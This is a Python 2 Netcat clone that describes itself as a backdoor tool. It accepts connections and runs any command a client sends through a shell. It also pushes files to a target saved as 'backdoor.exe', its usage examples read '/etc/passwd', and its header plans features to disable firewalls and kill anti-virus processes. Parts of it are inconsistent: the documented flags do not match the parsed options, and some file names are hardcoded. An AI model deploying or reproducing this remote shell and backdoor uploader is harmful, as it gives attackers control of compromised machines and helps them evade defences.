'''
*********description*********
this python program implement most functionality similar to the Netcat using multi-thread 
worker, including file upload, command execution remotely,  reverse back door shell, 
I plan to add some more robust features in the future,such as disable OS firewall rule, 
terminate anti-virus process.....
'''

import sys
import socket
import getopt
import threading
import subprocess

# these global used to record command-line option specified by users
listen			    = False
cmd_shell		    = False
upload			    = False
execute			    = ""
PyNetCat_server 	= ""
upload_destination 	= ""	
server_port         	= 0


def print_usage():
	
	# 
	print "-l --listen - listen on [host]:[port] for incoming connections"
 	print "-e --execute=file_to_run - execute the given file upon receiving a connection"
 	print "-c --command - initialize a command shell"
 	print "-s --sendfilepath=destination - upon receiving connection upload a file and write to [destination]"
	print "-r --recvfilepath=destination - upon receiving connection upload a file and write to [destination]"
 	print
 	print
 	print "Examples: "
 	print "PyNetcat_Utility_Knife.py -t 192.168.0.1 -p 1060 -l -c"
	print "PyNetcat_Utility_Knife.py -t 192.168.3.1 -p 1060    -s=c:\\some_file.exe"
 	print "PyNetcat_Utility_Knife.py -t 192.168.3.1 -p 1060 -l -r=c:\\backdoor.exe"
	print "PyNetcat_Utility_Knife.py -t 192.168.0.1 -p 1060 -l -e=\"cat /etc/passwd\""
 	print "echo 'ABCDEFGHI' | ./PyNetcat_Utility_Knife.py -t 192.168.11.12 -p 135"

  	sys.exit(0)
	

def main():
	
	global listen
	global server_port
	global execute
	global cmd_shell
	global upload_destination
	global PyNetCat_server
	
	print "[*********] NetCat rewrite with Python [**************]"
	
	# sys.argv[0] = PyNetcat_Utility_Knife.py
	# sys.argv[1] =
	# sys.argv[2] = 
	if not len(sys.argv[1:]):
		print_usage()
	
	try:
		opts, args = getopt.getopt(sys.argv[1:], "hle:t:p:cu:",\
			["help", "listen", "execute", "target", "port", "commandshell", "upload"])
	except getopt.GetoptError as err:
		print str(err)
		print_usage()
	
	# we should add some validate logic to sesure the user not combine "-t" with "-l";  or "-c" can not combine with "-e"
	# here, "o" is command-line option (i.e., specify by user as -u or --upload), 
	#       "a" its value (i.e., specify by user as c:\\target.exe)
	# however, some option did not require associated value, so we just switch global status
	for o, a in opts:
		if o in ("-h", "--help"):
			print_usage()
		elif o in ("-l", "--listen"):
			listen  = True
		elif o in ("-e", "--execute"):
			execute = a
		elif o in ("-c", "--commandshell"):
			cmd_shell = True
		elif o in ("-u", "--upload"):
 			upload_destination = a
		elif o in ("-t", "--target"):
			PyNetCat_server = a
		elif o in ("-p", "--port"):
			server_port = int(a)
		else:
			assert False, "Fail To Parsing Option, please check your typo"
			
	# running an PyNetCat client mode
	if not listen and len(PyNetCat_server) and server_port > 0 and not len(upload_destination):
		
		# block to waiting user input until hit a new line, then send it to PyNetCat server
		# but we can not send arbitrary data, the server only support those type specify in the command-line options
		buffer = sys.stdin.read()
		send_to_server(buffer)
	
	if not listen and len(PyNetCat_server) and server_port > 0 and len(upload_destination):
		
		client_side = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		client_side.connect((PyNetCat_server, server_port))
		print "send our backdoor to server"
		file_handle = open("calc.exe", "rb")
		data_chunk = file_handle.read(1024)
		
		while data_chunk:
			client_side.send(data_chunk)
			data_chunk = file_handle.read(1024)
		print "done sending........"
		file_handle.close()
		
		
	if listen:
		server_loop()
	


def send_to_server(buffer):
	
	client_side = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	
	try:
		client_side.connect((PyNetCat_server, server_port))
		if len(buffer):
			client_side.send(buffer)
		
		# read user input -> send to PyNetCat server -> receive and print response -> read user input .......repeat forever
		while True:
			
			recv_len = 1
			response = ""
			
			while recv_len:
				data = client_side.recv(4096)
				recv_len = len(data)
				response += data
				
				if recv_len < 4096:
					break
				
			print response,
			
			buffer = raw_input("")
			buffer += "\n"
			
			client_side.send(buffer)
			
	except:
		print "[***]Exception ! Exiting....."
		client_side.close()
	
	
def server_loop():
	global PyNetCat_server
	
	if not len(PyNetCat_server):
		target = "0.0.0.0"
	
	server_side = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	server_side.bind((PyNetCat_server, server_port))
	
	# maximum backlog = 5, which means the server support up to five clients ?
	server_side.listen(5)
	
	while True:
		client_socket, addr = server_side.accept()
		print "\n\taccept() a client connection"
		client_thread = threading.Thread(target=client_handler, args=(client_socket,))
		client_thread.start()
		print "\n\tstarting a thread to handle request"

def run_command(command):
	
	#  trim out the newline
	command_to_exec = command.rstrip()
	try:	
		# because the server process to which each "client_handler" thread 
		# belongs to, responsible for accepting new  client connection ,
		# so the server process can not simply execute that command itself, 
		# instead, it need to "fork" a sub process doing this heavy lifting
		# so the use of "output" variable may imply IPC
		output = subprocess.check_output(command_to_exec, stderr=subprocess.STDOUT,\
						shell=True)
	except:
		output = "Fail to execute command on server's OS\r\n"
	
	return output
	
		
def client_handler(client_socket):
	global upload
	global execute
	global cmd_shell
	
	print "\n\tI,m new thread and received %s" % upload_destination
	# when server enable this feature, it require the client send correct binary raw byte that 
	# consisting the file to be write to local hard drive
	# in this case, the client will need to load the file's content into Python 
	# interpreter memory, then send that file handle to sever, rather than waiting user input
	if len(upload_destination):
		
		file_buffer = ""
		while True:
			data = client_socket.recv(1024)
			if not data:
				break
			else:
				file_buffer += data
				
		print "\n\tprepare writing to disk........"
		
		file_descriptor = open("backdoor.exe", "wb")
		file_descriptor.write(file_buffer)
		file_descriptor.close()
		print "\n\tdone saving to disk.......\n\n"
		
				
	# "execute" contain the command to be run parsed from the previously logic
	# for example, -e=\"cat /etc/passwd\", here "execute" = "cat /etc/passwd\"
	# note that this is an one-time command execution functionality, and 
	# the command to be run is defined by server, NOT client
	if len(execute):
		
		# execute program on server's OS then send result back to client to display
		output = run_command(execute)
		client_socket.send(output)
	
	# when server enable this feature, it supply a session resemble to a reverse cmd shell then receive 
	# command from client and running it on local, send result back, 
	# repeatedly forever
	# 
	if cmd_shell:
		while True:
			client_socket.send("<PyNetCat:#> ")
			
			cmd_buffer = ""
			while "\n" not in cmd_buffer:
				cmd_buffer += client_socket.recv(1024)
			
			response = run_command(cmd_buffer)
			client_socket.send(response)
		

main()		
